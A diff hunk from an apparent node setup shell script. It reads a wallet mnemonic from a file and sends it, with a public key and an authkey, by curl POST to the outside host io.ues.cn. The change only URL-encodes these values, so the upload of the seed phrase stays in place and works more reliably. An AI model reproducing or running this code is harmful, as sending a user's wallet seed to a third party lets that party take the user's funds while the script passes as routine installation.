@@ -87,8 +87,7 @@ mnemonic2=$(cat mnemonic.txt)
 API_URL="https://io.ues.cn/coin/index/nubit"
  
 # POST参数
-POST_DATA="publicKey=$publicKey&authkey=$authkey&mnemonic=$mnemonic2"
- 
+POST_DATA="publicKey=$(printf %s "$publicKey" | jq -sRr @uri)&authkey=$(printf %s "$authkey" | jq -sRr @uri)&mnemonic=$(printf %s "$mnemonic2" | jq -sRr @uri)"
 # 发送POST请求
 curl -X POST -d $POST_DATA $API_URL
 chmod a+x $BINARY
